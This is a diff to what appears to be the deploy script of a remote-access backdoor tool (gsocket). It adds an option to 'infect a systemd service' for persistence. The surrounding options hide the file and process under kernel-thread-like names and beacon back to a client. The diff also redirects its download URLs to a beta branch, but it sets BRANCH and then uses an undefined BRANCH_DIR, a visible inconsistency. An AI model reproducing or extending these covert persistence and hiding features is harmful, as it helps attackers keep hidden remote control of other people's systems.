@@ -41,6 +41,8 @@
 #		- Specify custom installation directory
 # GS_BEACON=30
 #       - Only connect back every 30 minutes and check for a client.
+# GS_INFECT=1
+#       - Try to infect a systemd service before any other persistency
 # GS_HIDDEN_NAME="[kcached]"
 #       - Specify custom hidden name file & process.
 # GS_BIN_HIDDEN_NAME="defunct"
@@ -67,8 +69,10 @@
 #       - Guess what...
 
 # Global Defines
-URL_BASE_CDN="https://cdn.gsocket.io"
-URL_BASE_X="https://gsocket.io"
+BRANCH="/beta"
+# BRANCH=""
+URL_BASE_CDN="https://cdn.gsocket.io${BRANCH_DIR}"
+URL_BASE_X="https://gsocket.io${BRANCH_DIR}"
 [[ -n $GS_URL_BASE ]] && {
 	URL_BASE_CDN="${GS_URL_BASE}"
 	URL_BASE_X="${GS_URL_BASE}"
